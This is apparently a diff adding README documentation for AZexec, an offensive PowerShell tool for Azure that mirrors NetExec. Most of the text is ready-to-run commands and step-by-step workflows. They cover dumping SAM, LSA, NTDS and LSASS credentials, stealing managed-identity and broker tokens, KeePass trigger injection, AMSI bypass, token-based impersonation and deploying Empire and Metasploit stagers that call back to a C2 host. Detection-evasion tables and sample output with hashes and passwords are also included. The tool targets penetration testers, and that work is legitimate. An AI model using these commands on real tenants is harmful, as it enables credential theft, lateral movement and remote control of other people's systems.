+| *N/A (Azure-specific)* | `.\azx.ps1 creds -VMName "vm-01" -CredMethod tokens` | Extract Managed Identity tokens |
+| *N/A (Azure-specific)* | `.\azx.ps1 creds -VMName "vm-01" -CredMethod dpapi` | Extract DPAPI secrets |
+| *N/A* | `.\azx.ps1 creds -DeviceName "device" -ExecMethod mde` | Extract via MDE Live Response |
+| *N/A* | `.\azx.ps1 creds -DeviceName "device" -ExecMethod intune` | Extract via Intune Remediation |
+
+### Quick Start Examples
+
+```powershell
+# SAM extraction (NetExec --sam equivalent)
+.\azx.ps1 creds -VMName "vm-web-01"
+.\azx.ps1 creds -VMName "vm-web-01" -CredMethod sam
+.\azx.ps1 creds -AllVMs -ResourceGroup "Production-RG"
+
+# LSA secrets (NetExec --lsa equivalent)
+.\azx.ps1 creds -VMName "dc-01" -CredMethod lsa
+.\azx.ps1 creds -AllVMs -CredMethod lsa -ExportPath lsa.json
+
+# NTDS.dit dump (NetExec --ntds equivalent) - Domain Controllers only
+.\azx.ps1 creds -VMName "dc-01" -CredMethod ntds                          # VSS method (default)
+.\azx.ps1 creds -VMName "dc-01" -CredMethod ntds -NTDSMethod ntdsutil     # ntdsutil IFM method
+.\azx.ps1 creds -VMName "dc-01" -CredMethod ntds -NTDSMethod drsuapi      # DCSync via DSInternals
+.\azx.ps1 creds -VMName "dc-01" -CredMethod ntds -EnabledOnly              # Only enabled accounts
+.\azx.ps1 creds -VMName "dc-01" -CredMethod ntds -TargetDomainUser admin   # Specific user only
+
+# LSASS memory dump (NetExec -M lsassy equivalent)
+.\azx.ps1 creds -VMName "vm-01" -CredMethod lsass                         # comsvcs.dll (default)
+.\azx.ps1 creds -VMName "vm-01" -CredMethod lsass -LsassMethod procdump   # Via procdump
+.\azx.ps1 creds -VMName "vm-01" -CredMethod lsass -LsassMethod nanodump   # Via nanodump
+.\azx.ps1 creds -VMName "vm-01" -CredMethod lsass -LsassMethod direct     # P/Invoke MiniDumpWriteDump
+
+# Backup Operator (NetExec -M backup_operator equivalent)
+.\azx.ps1 creds -VMName "dc-01" -CredMethod backup
+
+# SCCM/Intune secrets (NetExec --sccm equivalent)
+.\azx.ps1 creds -VMName "vm-01" -CredMethod sccm                          # Filesystem search (default)
+.\azx.ps1 creds -VMName "vm-01" -CredMethod sccm -SCCMMethod api          # Graph API enumeration
+
+# WAM Token Broker (NetExec -M wam equivalent)
+.\azx.ps1 creds -VMName "vm-01" -CredMethod wam
+.\azx.ps1 creds -AllVMs -CredMethod wam -ExportPath wam.json
+
+# WiFi passwords (NetExec -M wifi equivalent)
+.\azx.ps1 creds -VMName "vm-01" -CredMethod wifi
+
+# Application credentials (NetExec -M putty/winscp/vnc/mremoteng equivalent)
+.\azx.ps1 creds -VMName "vm-01" -CredMethod putty                          # PuTTY saved sessions
+.\azx.ps1 creds -VMName "vm-01" -CredMethod winscp                         # WinSCP (XOR decrypt)
+.\azx.ps1 creds -VMName "vm-01" -CredMethod vnc                            # VNC (DES decrypt)
+.\azx.ps1 creds -VMName "vm-01" -CredMethod mremoteng                      # mRemoteNG (AES-GCM)
+.\azx.ps1 creds -VMName "vm-01" -CredMethod veeam                          # Veeam (SQL + DPAPI)
+
+# KeePass (NetExec -M keepass_discover/keepass_trigger equivalent)
+.\azx.ps1 creds -VMName "vm-01" -CredMethod keepass_discover               # Find KeePass installs
+.\azx.ps1 creds -VMName "vm-01" -CredMethod keepass_trigger                # Full trigger cycle
+.\azx.ps1 creds -VMName "vm-01" -CredMethod keepass_trigger -KeePassAction add     # Inject trigger only
+.\azx.ps1 creds -VMName "vm-01" -CredMethod keepass_trigger -KeePassAction poll    # Poll for export
+.\azx.ps1 creds -VMName "vm-01" -CredMethod keepass_trigger -KeePassAction clean   # Clean up
+
+# Forensic extraction (NetExec -M notepad/rdcman/eventlog_creds equivalent)
+.\azx.ps1 creds -VMName "vm-01" -CredMethod notepad                        # Notepad tab state
+.\azx.ps1 creds -VMName "vm-01" -CredMethod notepadpp                      # Notepad++ backups
+.\azx.ps1 creds -VMName "vm-01" -CredMethod rdcman                         # RDCMan .rdg files
+.\azx.ps1 creds -VMName "vm-01" -CredMethod eventlog_creds                 # Event log credentials
+
+# Managed Identity token extraction (Azure-specific)
+.\azx.ps1 creds -VMName "vm-web-01" -CredMethod tokens
+.\azx.ps1 creds -AllVMs -CredMethod tokens
+
+# DPAPI secrets (browser creds, credential manager, WiFi)
+.\azx.ps1 creds -VMName "vm-web-01" -CredMethod dpapi
+
+# All extraction methods (including new methods)
+.\azx.ps1 creds -VMName "vm-web-01" -CredMethod all
+
+# Arc devices
+.\azx.ps1 creds -DeviceName "arc-server-01"
+.\azx.ps1 creds -AllDevices -CredMethod sam
+
+# MDE devices (async with polling)
+.\azx.ps1 creds -DeviceName "mde-device-01" -ExecMethod mde -CredMethod tokens
+.\azx.ps1 creds -DeviceName "mde-endpoint" -ExecMethod mde -CredMethod sam
+
+# Intune devices (async, output in portal only)
+.\azx.ps1 creds -DeviceName "intune-device-01" -ExecMethod intune -CredMethod sam
+
+# Auto-detection (tries Arc, then MDE, then Intune)
+.\azx.ps1 creds -DeviceName "some-device" -CredMethod sam
+
+# Export for cracking
+.\azx.ps1 creds -VMName "vm-01" -HashcatFormat -ExportPath hashes.txt
+.\azx.ps1 creds -AllVMs -ExportPath results.json
+```
+
+> **Note**: `auto` mode runs only the conservative methods (sam + tokens + dpapi). New methods (lsa, ntds, lsass, backup, sccm, wam) must be explicitly selected. Use `-CredMethod all` to run everything.
+
+### Execution Method Selection (`-ExecMethod`)
+
+| Value | Description |
+|-------|-------------|
+| **auto** (default) | Auto-detects device type and uses appropriate method |
+| **vmrun** | Force Azure VM Run Command |
+| **arc** | Force Arc Run Command |
+| **mde** | Force MDE Live Response (requires Machine.LiveResponse permission) |
+| **intune** | Force Intune Proactive Remediation (async, portal output only) |
+
+> ⚠️ **Intune Limitation**: Intune Proactive Remediation is async-only. Output is not returned directly and is only visible in the Intune portal. This makes Intune less useful for credential extraction where you need immediate output. Use MDE for better results when both are available.
+
+### OPSEC Considerations
+
+> ⚠️ **WARNING**: Credential extraction triggers security alerts!
+
+The `creds` command will display method-specific OPSEC warnings before execution:
+
+| Method | Detection Risk | Key Indicators |
+|--------|---------------|----------------|
+| **sam** | HIGH | Event ID 4656/4663 (SAM key access), Event ID 4688 (reg.exe), MDE credential dump alert |
+| **lsa** | HIGH | Event ID 4656/4663 (SECURITY hive), MDE "Suspicious registry hive export" |
+| **ntds** | CRITICAL | Event ID 8222 (shadow copy), ntdsutil alerts, MDE "AD database dump" |
+| **lsass** | CRITICAL | Event ID 10 (Sysmon LSASS access), MDE "Suspicious LSASS access" (HIGH), Credential Guard blocks |
+| **backup** | HIGH | Event ID 4672 (SeBackupPrivilege), robocopy /B execution |
+| **sccm** | MEDIUM | Event ID 4663 (SYSVOL GPP access), filesystem scanning behavioral alerts |
+| **wam** | MEDIUM | Event ID 4663 (TokenBroker cache access), AAD Broker Plugin data access |
+| **tokens** | MEDIUM | IMDS queries (169.254.169.254), Azure-specific logging |
+| **dpapi** | MEDIUM | cmdkey enumeration, netsh wlan profile queries |
+
+### External Tool Requirements
+
+| Tool | Used By | Purpose | Install |
+|------|---------|---------|---------|
+| **secretsdump.py** (Impacket) | sam, lsa, ntds, backup | Parse registry hives and NTDS.dit offline | `pip install impacket` |
+| **pypykatz** | lsass | Parse LSASS memory dumps offline | `pip install pypykatz` |
+| **DSInternals** | ntds (drsuapi) | DCSync via PowerShell on target DC | `Install-Module DSInternals` (on target) |
+
+> All methods gracefully degrade when external tools are unavailable — hives/dumps are extracted and saved locally with instructions for offline parsing.
+
+### Sample Output
+
+```
+[*] AZX - Credential Extraction
+[*] Command: creds (Azure equivalent of nxc smb --sam/--lsa/--ntds)
+
+[*] Target: vm-web-01 (Windows Server 2022)
+AZR    vm-web-01            443    Windows     (SAM_DUMP)
+AZR    vm-web-01            443    Windows     Administrator:500:aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+AZR    vm-web-01            443    Windows     Guest:501:aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+AZR    vm-web-01            443    Windows     svc_backup:1001:aad3b435b51404ee:e52cac67419a6a9a42f8b3674a46f48b:::
+AZR    vm-web-01            443    Windows     (LSA_DUMP)
+AZR    vm-web-01            443    Windows     LSA Secret: _SC_svc_sql -> P@ssw0rd123!
+AZR    vm-web-01            443    Windows     DCC2: CORP\admin:$DCC2$10240#admin#a1b2c3d4...
+AZR    vm-web-01            443    Windows     Machine Account: CORP\VM-WEB-01$:aad3b435b51404ee:5a6b7c8d...
+AZR    vm-web-01            443    Windows     (TOKEN_DUMP)
+AZR    vm-web-01            443    Windows     MI Token: management.azure.com (expires: 3600s)
+AZR    vm-web-01            443    Windows     MI Token: graph.microsoft.com (expires: 3600s)
+AZR    vm-web-01            443    Windows     (DPAPI_DUMP)
+AZR    vm-web-01            443    Windows     WiFi: CorpWiFi -> [PLAINTEXT] SecretKey123
+AZR    vm-web-01            443    Windows     CredMan: Domain:target=server01 -> user@domain.com
+AZR    vm-web-01            443    Windows     Browser: Chrome Login Data found (extract offline)
+AZR    vm-web-01            443    Windows     (SCCM_DUMP)
+AZR    vm-web-01            443    Windows     GPP cpassword: \\SYSVOL\Groups.xml -> svc_deploy:D3pl0yP@ss
+AZR    vm-web-01            443    Windows     IIS Config: applicationHost.config -> svc_web:WebP@ss123
+AZR    vm-web-01            443    Windows     (WAM_DUMP)
+AZR    vm-web-01            443    Windows     WAM Token: user@contoso.com -> graph.microsoft.com (exp: 2025-01-15 14:30:00 UTC)
+AZR    vm-web-01            443    Windows     WAM Token: admin@contoso.com -> management.azure.com (exp: 2025-01-15 15:00:00 UTC)
+
+[*] Target: dc-01 (Windows Server 2022)
+AZR    dc-01                443    Windows     (NTDS_DUMP)
+AZR    dc-01                443    Windows     Administrator:500:aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+AZR    dc-01                443    Windows     krbtgt:502:aad3b435b51404ee:a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6:::
+AZR    dc-01                443    Windows     Total hashes: 1247
+
+[*] EXTRACTION SUMMARY
+[*] Targets: 2 | SAM: 3 | LSA: 3 | Tokens: 2 | DPAPI: 3 | NTDS: 1247 | SCCM: 2 | WAM: 2 | Errors: 0
+```
+
+### Technical Details
+
+#### SAM Extraction Workflow
+1. PowerShell script deployed via:
+   - **VM Run Command** (vmrun) - Azure VMs
+   - **Arc Run Command** (arc) - Arc-enabled servers
+   - **MDE Live Response** (mde) - MDE-enrolled devices (async with polling)
+   - **Intune Proactive Remediation** (intune) - Intune-managed devices (async, portal output)
+2. Registry hives exported using `reg.exe save` (better AV evasion)
+3. Hives base64-encoded for transfer via command output
+4. Hives decoded locally and parsed:
+   - **Primary**: `secretsdump.py` (Impacket) if available
+   - **Fallback**: Manual bootkey extraction and SAM decryption
+
+#### Token Extraction Workflow
+1. Query Azure Instance Metadata Service (IMDS) at `169.254.169.254`
+2. Request tokens for multiple Azure resources:
+   - `management.azure.com` (Azure Resource Manager)
+   - `graph.microsoft.com` (Microsoft Graph)
+   - `vault.azure.net` (Key Vault)
+   - `storage.azure.com` (Storage)
+3. Return JWT tokens with expiration times
+
+#### DPAPI Extraction Workflow
+1. **Credential Manager**: Parse `cmdkey /list` output
+2. **WiFi Profiles**: Extract PSKs via `netsh wlan show profile key=clear`
+3. **Browser Credentials**: Identify Login Data paths for offline extraction
+
+#### LSA Secrets Extraction Workflow
+1. Export SYSTEM + SECURITY registry hives via `reg.exe save`
+2. Base64-encode hives for transfer
+3. Decode locally and parse with `secretsdump.py -security SECURITY -system SYSTEM LOCAL`
+4. Extract: LSA secrets (service account passwords), cached domain credentials (DCC2), machine account NTLM hash, DPAPI backup key
+
+#### NTDS.dit Dump Workflow
+1. **DC Detection**: Check for running NTDS service (non-DC targets get clear error)
+2. **VSS method** (default): Create Volume Shadow Copy, copy `ntds.dit` + SYSTEM from shadow path
+3. **ntdsutil method**: Run `ntdsutil "activate instance ntds" "ifm" "create full <path>"`
+4. **drsuapi method**: Use DSInternals `Get-ADReplAccount -All` for inline DCSync
+5. Large files staged for transfer via `Receive-VMFile` / `Receive-DeviceFile`
+6. Parse locally with `secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL`
+
+#### LSASS Memory Dump Workflow
+1. Get LSASS process PID
+2. **comsvcs** (default): `rundll32.exe comsvcs.dll, MiniDump <PID> <path> full`
+3. **procdump**: `procdump.exe -accepteula -ma lsass.exe <path>`
+4. **nanodump**: `nanodump.exe --write <path>`
+5. **direct**: P/Invoke `MiniDumpWriteDump` from `dbghelp.dll`
+6. Dump staged for transfer via `Receive-VMFile` (up to 200MB)
+7. Parse locally with `pypykatz lsa minidump <path>` (extracts MSV, WDigest, Kerberos)
+
+#### Backup Operator Workflow
+1. Check `SeBackupPrivilege` via `whoami /priv`
+2. Use `robocopy /B` (backup semantics) to copy SAM/SYSTEM/SECURITY
+3. If target is a DC, also stage NTDS.dit via backup semantics
+4. Base64-encode hives for transfer, parse with secretsdump
+
+#### SCCM/Intune Extraction Workflow
+1. **Disk method**: Search filesystem for:
+   - GPP cpassword files in SYSVOL (Groups.xml, Services.xml, etc.) — decrypts using Microsoft's published AES key
+   - SCCM client cache (`C:\Windows\ccmcache`) scripts/configs with embedded credentials
+   - Intune Management Extension deployed scripts with hardcoded secrets
+   - IIS `applicationHost.config` with processModel/virtualDirectory credentials
+2. **API method**: Enumerate Intune configuration profiles via Microsoft Graph API
+
+#### WAM Token Broker Workflow
+1. Enumerate all user profiles via ProfileList registry key
+2. For each user, search:
+   - TokenBroker cache (`.tbres`, `.tbacct`) in `%LOCALAPPDATA%\Microsoft\TokenBroker\Cache\`
+   - AAD Broker Plugin tokens in `%LOCALAPPDATA%\Packages\Microsoft.AAD.BrokerPlugin_*\AC\TokenBroker\Accounts\`
+   - IdentityCache for JWT patterns
+3. Decode JWT payloads (base64), extract claims (UPN, audience, scope, expiry)
+4. Enumerate DPAPI masterkey files from `%APPDATA%\Microsoft\Protect\<SID>\`
+
+#### MDE Live Response Workflow
+1. Acquire MDE API token via `Get-AzAccessToken -ResourceUrl "https://api.security.microsoft.com"`
+2. Query device by name via `/api/machines`
+3. Submit RunScript action via `/api/machines/{id}/runliveresponse`
+4. Poll `/api/machineactions/{actionId}` every 5 seconds
+5. Retrieve output via `GetLiveResponseResultDownloadLink` endpoint
+6. Timeout: 10 minutes maximum
+
+#### Intune Proactive Remediation Workflow
+1. Create temporary `deviceHealthScript` with base64-encoded command
+2. Trigger `initiateOnDemandProactiveRemediation` on target device
+3. Cleanup temporary script
+4. **Note**: Output only visible in Intune portal - no immediate return
+
+### Required Permissions
+
+| Target Type | Required Permissions |
+|-------------|---------------------|
+| **Azure VMs** | Reader + Virtual Machine Command Executor (or VM Contributor) |
+| **Arc Devices** | Azure Connected Machine Resource Administrator |
+| **MDE Devices** | Machine.LiveResponse + Machine.Read.All |
+| **Intune Devices** | DeviceManagementManagedDevices.PrivilegedOperations.All |
+
+---
+
+## ⚡ Remote Command Execution - Azure's NetExec -x/-X Equivalent
+
+For penetration testers familiar with NetExec's remote command execution capabilities (`-x` for shell commands, `-X` for PowerShell), AZexec provides the **Azure cloud equivalent** through the `exec` command.
+
+### Execution Methods
+
+AZexec supports six execution methods, with automatic failover in `auto` mode:
+
+| Method | Target | Execution Type | Use Case | Priority |
+|--------|--------|----------------|----------|----------|
+| **vmrun** | Azure VMs | Synchronous | Primary method - uses Azure VM Run Command | 1st |
+| **arc** | Arc-enabled servers | Synchronous | On-prem/hybrid servers connected to Azure Arc | 2nd |
+| **mde** | MDE-enrolled devices | Async (polling) | Devices with Microsoft Defender for Endpoint | 3rd |
+| **intune** | Intune-managed devices | Async | Endpoints managed via Intune/Endpoint Manager | 4th |
+| **automation** | Hybrid Workers | Job-based | Servers with Azure Automation extension | 5th |
+| **pi** | Windows targets | Token manipulation | Execute as target user via process injection | N/A |
+
+**Synchronous vs Asynchronous Methods:**
+- **Synchronous** (vmrun, arc): Immediate execution with direct output - best for real-time command execution
+- **Asynchronous** (mde, intune, automation): Queued execution with polling/delayed results - useful for devices not Arc-enabled
+
+### Command Mapping
+
+| NetExec Command | AZexec Equivalent | Description |
+|-----------------|-------------------|-------------|
+| `nxc smb <target> -x "whoami"` | `.\azx.ps1 exec -VMName "vm-01" -x "whoami"` | Execute shell command on VM |
+| `nxc smb <target> -X "$env:COMPUTERNAME"` | `.\azx.ps1 exec -VMName "vm-01" -x '$env:COMPUTERNAME' -PowerShell` | Execute PowerShell on VM |
+| `nxc smb <targets> -x "hostname"` | `.\azx.ps1 exec -x "hostname" -AllVMs` | Execute on all VMs |
+| `nxc smb <target> -x "cmd" --exec-method smbexec` | `.\azx.ps1 exec -VMName "vm-01" -x "cmd" -ExecMethod vmrun` | Force specific method |
+| *N/A (Arc device)* | `.\azx.ps1 exec -DeviceName "LAPTOP-001" -x "hostname"` | Execute on Arc-enabled device |
+| *N/A (All Arc devices)* | `.\azx.ps1 exec -x "hostname" -AllDevices` | Execute on all Arc devices |
+| *N/A (MDE device)* | `.\azx.ps1 exec -DeviceName "LAPTOP-001" -x "hostname" -ExecMethod mde` | Execute via MDE Live Response |
+| *N/A (Intune device)* | `.\azx.ps1 exec -DeviceName "LAPTOP-001" -x "hostname" -ExecMethod intune` | Execute via Intune Remediation |
+| *N/A (Automation)* | `.\azx.ps1 exec -VMName "server-01" -x "hostname" -ExecMethod automation` | Execute via Azure Automation |
+| `nxc smb <target> -X "cmd" --amsi-bypass /path` | `.\azx.ps1 exec -VMName "vm-01" -x "cmd" -PowerShell -AmsiBypass bypass.ps1` | Execute with AMSI bypass |
+| `nxc smb <target> -M pi -o PID=1234 EXEC=cmd` | `.\azx.ps1 exec -VMName "vm-01" -x "cmd" -ExecMethod pi -PID 1234` | Process injection by PID |
+| `nxc smb <target> -M pi -o USER=admin EXEC=cmd` | `.\azx.ps1 exec -VMName "vm-01" -x "cmd" -ExecMethod pi -TargetUser "DOMAIN\admin"` | Process injection by user |
+
+### Targeting Options
+
+AZexec provides two targeting modes for remote command execution:
+
+| Targeting Mode | Parameters | Use Case |
+|----------------|------------|----------|
+| **VM Targeting** | `-VMName` / `-AllVMs` | Azure VMs (traditional cloud VMs) |
+| **Device Targeting** | `-DeviceName` / `-AllDevices` | Arc-enabled devices (on-prem/hybrid servers, workstations) |
+
+**Device Targeting** is designed for Arc-enabled machines, which support immediate command execution via `Invoke-AzConnectedMachineRunCommand`. For non-Arc devices, AZexec will attempt fallback methods in order: MDE Live Response, then Intune Proactive Remediation.
+
+### Usage Examples
+
+**VM Targeting (Azure VMs):**
+```powershell
+# Execute shell command on single VM (like nxc -x)
+.\azx.ps1 exec -VMName "vm-web-01" -x "whoami"
+
+# Execute PowerShell on single VM (like nxc -X)
+.\azx.ps1 exec -VMName "vm-web-01" -x '$env:COMPUTERNAME' -PowerShell
+
+# Execute on all VMs in resource group (requires -AllVMs flag for safety)
+.\azx.ps1 exec -ResourceGroup "Production-RG" -x "hostname" -AllVMs
+
+# Execute across all subscriptions with export
+.\azx.ps1 exec -x "whoami /all" -AllVMs -ExportPath results.csv
+
+# Linux VM execution (auto-detected)
+.\azx.ps1 exec -VMName "linux-vm-01" -x "id && hostname"
+
+# Filter to only running VMs
+.\azx.ps1 exec -x "hostname" -AllVMs -VMFilter running
+```
+
+**Device Targeting (Arc-enabled Devices):**
+```powershell
+# Execute shell command on single Arc device
+.\azx.ps1 exec -DeviceName "LAPTOP-001" -x "hostname"
+
+# Execute PowerShell on Arc device
+.\azx.ps1 exec -DeviceName "ARC-SERVER-01" -x '$env:COMPUTERNAME' -PowerShell
+
+# Execute on all Arc-enabled devices
+.\azx.ps1 exec -x "whoami" -AllDevices
+
+# Execute on all Arc devices with export
+.\azx.ps1 exec -x "hostname" -AllDevices -ExportPath arc-results.csv
+
+# Execute on Arc devices in specific resource group
+.\azx.ps1 exec -ResourceGroup "Hybrid-Servers-RG" -x "id" -AllDevices
+```
+
+**Method Selection:**
+```powershell
+# Force specific execution method (Arc-enabled server)
+.\azx.ps1 exec -VMName "arc-server-01" -x "id" -ExecMethod arc
+
+# Execute via MDE Live Response (for MDE-enrolled devices)
+.\azx.ps1 exec -DeviceName "LAPTOP-001" -x "hostname" -ExecMethod mde
+
+# Execute via Intune Proactive Remediation (async - check Intune portal for results)
+.\azx.ps1 exec -DeviceName "LAPTOP-001" -x "whoami" -ExecMethod intune
+
+# Execute via Azure Automation (requires Hybrid Worker configuration)
+.\azx.ps1 exec -VMName "server-01" -x "hostname" -ExecMethod automation
+```
+
+**AMSI Bypass (PowerShell only):**
+```powershell
+# Execute PowerShell with AMSI bypass prepended
+.\azx.ps1 exec -VMName "vm-01" -x "Invoke-Mimikatz" -PowerShell -AmsiBypass bypass.ps1
+
+# Works with all execution methods
+.\azx.ps1 exec -DeviceName "LAPTOP-001" -x "cmd" -PowerShell -AmsiBypass bypass.ps1 -ExecMethod mde
+```
+
+**Process Injection (User Impersonation):**
+
+The `pi` execution method is the Azure equivalent of NetExec's `-M pi` (process injection) module. Since Azure doesn't provide direct memory access to VMs, AZexec achieves the same outcome (execute as target user) through PowerShell-based token manipulation techniques.
+
+```powershell
+# Execute command as specific user by injecting into their process (by PID)
+.\azx.ps1 exec -VMName "vm-01" -x "whoami" -ExecMethod pi -PID 1234
+
+# Auto-find process owned by target user
+.\azx.ps1 exec -VMName "vm-01" -x "whoami" -ExecMethod pi -TargetUser "DOMAIN\admin"
+
+# Combine with AMSI bypass for evasion
+.\azx.ps1 exec -VMName "vm-01" -x "Invoke-Mimikatz" -ExecMethod pi -TargetUser "admin" -AmsiBypass bypass.ps1
+```
+
+**How Process Injection Works:**
+1. The PI script is delivered to the target via the underlying method (vmrun, arc, mde, or intune)
+2. Script runs as SYSTEM (Azure execution always runs as SYSTEM)
+3. If `-TargetUser` specified, finds a process owned by that user
+4. Opens process handle and duplicates the user's token
+5. Creates new process with duplicated token via `CreateProcessWithTokenW`
+6. Command executes in the impersonated user's security context
+
+**Underlying Delivery Methods:**
+The PI method automatically discovers targets and uses the appropriate delivery mechanism:
+- **Azure VMs** → uses `vmrun` (Azure VM Run Command)
+- **Arc-enabled servers** → uses `arc` (Azure Arc Run Command)
+- **MDE-enrolled devices** → uses `mde` (MDE Live Response)
+- **Intune-managed devices** → uses `intune` (Intune Proactive Remediation)
+
+```powershell
+# PI on Azure VM (delivered via vmrun)
+.\azx.ps1 exec -VMName "vm-01" -x "whoami" -ExecMethod pi -TargetUser "admin"
+
+# PI on Arc-enabled device (delivered via arc)
+.\azx.ps1 exec -DeviceName "ARC-SERVER-01" -x "whoami" -ExecMethod pi -TargetUser "admin"
+
+# PI on MDE-enrolled device (delivered via mde - if not Arc-enabled)
+.\azx.ps1 exec -DeviceName "LAPTOP-001" -x "whoami" -ExecMethod pi -TargetUser "admin"
+```
+
+**Process Injection Requirements:**
+- Windows targets only (Linux N/A for token impersonation)
+- Target user must have an active process on the VM
+- Requires SYSTEM privileges (standard for Azure execution methods)
+
+**NetExec Comparison:**
+| NetExec Command | AZexec Equivalent |
+|-----------------|-------------------|
+| `nxc smb <target> -M pi -o PID=1234 EXEC=whoami` | `.\azx.ps1 exec -VMName "vm-01" -x "whoami" -ExecMethod pi -PID 1234` |
+| `nxc smb <target> -M pi -o USER=admin EXEC=whoami` | `.\azx.ps1 exec -VMName "vm-01" -x "whoami" -ExecMethod pi -TargetUser "admin"` |
+
+### Output Format
+
+Successful execution displays NetExec-style output with the "(Exec3d!)" indicator:
+
+```
+AZR       vm-web-01             443    Windows     (Exec3d!)   nt authority\system
+```
+
+### Required Permissions
+
+| Method | Required RBAC Roles / API Permissions |
+|--------|---------------------------------------|
+| **vmrun** | Virtual Machine Contributor or Reader + Virtual Machine Command Executor |
+| **arc** | Azure Connected Machine Resource Administrator |
+| **mde** | Machine.LiveResponse, Machine.Read.All (Microsoft Defender Security API) |
+| **intune** | DeviceManagementManagedDevices.PrivilegedOperations.All (Microsoft Graph) |
+| **automation** | Automation Contributor (Azure RBAC) |
+| **pi** | Same as underlying method (vmrun/arc) - uses token manipulation on target |
+
+### Technical Comparison
+
+| Aspect | On-Premises (NetExec) | Azure (AZexec exec) |
+|--------|----------------------|---------------------|
+| **Protocol** | SMB/WMI (port 445) | Azure REST API (HTTPS/443) |
+| **Shell Mode (-x)** | cmd.exe / /bin/sh | cmd.exe / /bin/sh via Run Command |
+| **PowerShell Mode (-X)** | powershell.exe | PowerShell via Run Command |
+| **Authentication** | NTLM/Kerberos | Azure AD OAuth2 |
+| **Logging** | Windows Event Logs | Azure Activity Logs (all queries logged) |
+| **Network** | Direct network access | No network access needed (cloud API) |
+
+### Execution Method Details
+
+| Method | API Endpoint | Timeout | Best For |
+|--------|--------------|---------|----------|
+| **vmrun** | Azure VM Run Command API | ~5 min | Azure VMs (immediate results) |
+| **arc** | Azure Arc Run Command API | ~5 min | Arc-enabled servers (immediate results) |
+| **mde** | Security API `/machines/{id}/runliveresponse` | 10 min | MDE-enrolled devices (with polling) |
+| **intune** | Graph API `/managedDevices/{id}/initiateOnDemandProactiveRemediation` | Async | Intune-managed devices (check portal) |
+| **automation** | Azure Automation Runbook API | Variable | Hybrid Worker-configured servers |
+| **pi** | Token manipulation via vmrun/arc | ~5 min | Execute as target user (Windows only) |
+
+**When to Use Each Method:**
+- **vmrun/arc**: Use for Azure VMs and Arc-enabled servers - fastest execution with immediate output
+- **mde**: Use for Entra ID joined devices with MDE agent but no Arc agent - async with polling (up to 10 min)
+- **intune**: Use for Intune-managed devices - fully async, check Intune portal for results
+- **automation**: Use for servers with Azure Automation Hybrid Worker extension configured
+- **pi**: Use when you need to execute commands as a specific user rather than SYSTEM
+
+---
+
+## 🐚 Getting Shells - Empire and Metasploit Integration
+
+For penetration testers familiar with NetExec's shell modules (`-M empire_exec` and `-M met_inject`), AZexec provides the **Azure cloud equivalent** through the `empire-exec` and `met-inject` commands.
+
+These commands generate C2 payloads and deploy them via Azure execution methods (VM Run Command, Arc Run Command, etc.), providing a seamless path from Azure access to interactive shells.
+
+### Command Mapping
+
+| NetExec Command | AZexec Equivalent | Description |
+|-----------------|-------------------|-------------|
+| `nxc smb <target> -M empire_exec -o LISTENER=http` | `.\azx.ps1 empire-exec -Listener http -EmpireHost host -VMName "vm"` | Deploy Empire stager |
+| `nxc smb <targets> -M empire_exec -o LISTENER=http` | `.\azx.ps1 empire-exec -Listener http -EmpireHost host -AllVMs` | Deploy to all VMs |
+| `nxc smb <target> -M met_inject -o SRVHOST=10.0.0.1 SRVPORT=8080 RAND=abc` | `.\azx.ps1 met-inject -SRVHOST 10.0.0.1 -SRVPORT 8080 -RAND abc -VMName "vm"` | Inject Metasploit payload |
+| `nxc smb <targets> -M met_inject -o SRVHOST=10.0.0.1 SRVPORT=8080 RAND=abc` | `.\azx.ps1 met-inject -SRVHOST 10.0.0.1 -SRVPORT 8080 -RAND abc -AllVMs` | Inject on all VMs |
+
+### Empire Execution (`empire-exec`)
+
+The `empire-exec` command connects to an Empire C2 server's REST API, generates a PowerShell stager for the specified listener, and deploys it to Azure targets.
+
+**How It Works:**
+1. Authenticates to Empire REST API (`/api/v2/auth/token`)
+2. Requests a stager for the specified listener (`/api/v2/stagers`)
+3. Deploys the stager to targets via Azure execution methods
+4. Target executes stager → connects back to Empire listener
+
+**Parameters:**
+
+| Parameter | Required | Description |
+|-----------|----------|-------------|
+| `-Listener` | ✅ Yes | Empire listener name (e.g., "http", "https") |
+| `-EmpireHost` | ✅ Yes* | Empire server hostname or IP |
+| `-EmpirePort` | No | Empire API port (default: 1337) |
+| `-EmpireUsername` | ✅ Yes* | Empire API username |
+| `-EmpirePassword` | ✅ Yes* | Empire API password |
+| `-EmpireConfigFile` | No | Path to JSON config file (alternative to individual params) |
+| `-SSL` | No | Use HTTPS for Empire API connection |
+| `-Obfuscate` | No | Enable stager obfuscation |
+| `-ObfuscateCommand` | No | Obfuscation options (default: "Token,All,1") |
+| `-AmsiBypass` | No | Path to AMSI bypass script to prepend |
+
+*Can be provided via `-EmpireConfigFile` instead
+
+**Empire Config File Format:**
+```json
+{
+    "host": "empire.example.com",
+    "port": 1337,
+    "username": "empireadmin",
+    "password": "password123",
+    "ssl": true
+}
+```
+
+**Usage Examples:**
+
+```powershell
+# Deploy Empire stager to single VM
+.\azx.ps1 empire-exec -Listener http -EmpireHost empire.local -EmpireUsername admin -EmpirePassword pass -VMName vm-01
+
+# Deploy to single VM using config file
+.\azx.ps1 empire-exec -Listener http -EmpireConfigFile empire-config.json -VMName vm-01
+
+# Deploy to all VMs with SSL and obfuscation
+.\azx.ps1 empire-exec -Listener https -EmpireHost empire.local -EmpireUsername admin -EmpirePassword pass -SSL -Obfuscate -AllVMs
+
+# Deploy to Arc-enabled devices
+.\azx.ps1 empire-exec -Listener http -EmpireHost empire.local -EmpireUsername admin -EmpirePassword pass -AllDevices
+
+# Deploy with AMSI bypass
+.\azx.ps1 empire-exec -Listener http -EmpireHost empire.local -EmpireUsername admin -EmpirePassword pass -AmsiBypass bypass.ps1 -VMName vm-01
+
+# Deploy to specific resource group with export
+.\azx.ps1 empire-exec -Listener http -EmpireConfigFile config.json -ResourceGroup "Production-RG" -AllVMs -ExportPath empire-results.csv
+```
+
+**Empire Server Setup:**
+```bash
+# Start Empire with REST API
+./ps-empire server
+
+# Or with Docker
+docker run -it -p 1337:1337 -p 5000:5000 bc-security/empire:latest server
+
+# Create a listener in Empire
+uselistener http
+set Host http://your-empire-server:80
+set Port 80
+execute
+```
+
+**Output Format:**
+```
+AZR       vm-web-01             443    Windows     (Empire!)   http listener deployed
+```
+
